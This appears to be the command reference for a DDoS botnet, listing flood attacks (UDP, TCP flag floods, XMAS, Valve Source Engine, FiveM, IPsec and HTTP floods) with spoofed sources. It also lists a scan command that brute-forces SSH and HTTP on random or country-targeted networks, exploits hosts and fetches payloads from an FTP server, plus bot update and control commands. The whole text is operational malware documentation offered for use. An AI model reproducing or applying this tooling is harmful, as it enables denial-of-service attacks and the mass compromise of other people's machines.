ATTACK VECTORS:
	
        # Mark: The min and max of attack size will be 50 - 1400 bytes. If you put over or lower size it will set to 100 automatically.
        
	# Tip: You can use the "-r" command for random DST ports and src IPs, but it can only use with these 2 args!!!
	# Example: ?tcp -fin -r 192.168.50.129 -r 100

	?udp <src> <dst> <port> <size>                Just a normal UDP flood attack.
	?tcp <flag> <src> <dst> <port> <size>	      TCP flood with customizes flag.

		-syn            TCP flood with syn packet, just a normal SYN flood.
		-ack		TCP flood with ack packet, just a normal ACK flood.
		-psh		TCP flood with psh packet, just a normal PSH flood.
		-urg		TCP flood with urg packet, just a normal URG flood.
		-rst		TCP flood with RST packet, for broke a TCP connection between client and target server.
		-fin		TCP flood with FIN packet, to request close connection when target server is blocking a syn packet.

	?saf <src> <dst> <port> <size>                Flood by using TCP SYN+ACK flags to the target server.
	?xmas <src> <dst> <port> <size>		      Flood TCP packets by using all of the TCP flags to the target server.
	?vse <src> <dst> <port>			      Flood TSource Engine Query request to the target game server that used valve source engine.
	?fms <src> <dst>			      Flood query payload to a FiveM game server.
	?ipsec <src> <dst>			      Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
	?poling <url>			      	      Flood HTTP post-login requests to the target login web page, didn't do any of IP spoofing!!!
	?jumbo <url>				      Flood HTTP post request with a big XML payload, didn't do any of IP spoofing!!!
	?get <url>			      	      Flood HTTP get requests to the target website, didn't do any of IP spoofing!!!

SCAN FUNCTION:
		
	# Example: ?scan -r ftp://192.168.40.14/bin/payload_x32 ftp://192.168.40.14/bin/payload_mips_x32
		
	?scan <network> <default> <mips>		Scan default SSH and HTTP port on the network, brute-force attack, and exploit the target.

		-cn		Scan on china network.
		-hk		Scan on hong kong network.
		-kr		Scan on south korea network.
		-br		Scan on brazil network.
		-r		Scan with random IPs.
		
?update <default> <mips>                Update the bot source code or adapt it as a service.
?info				        Get bot system information, for bot analysis, etc.
?kill				        Bot self-close.
?stopddos 			        Stop DDoS attacking.
?stopscan			        Stop scanning.
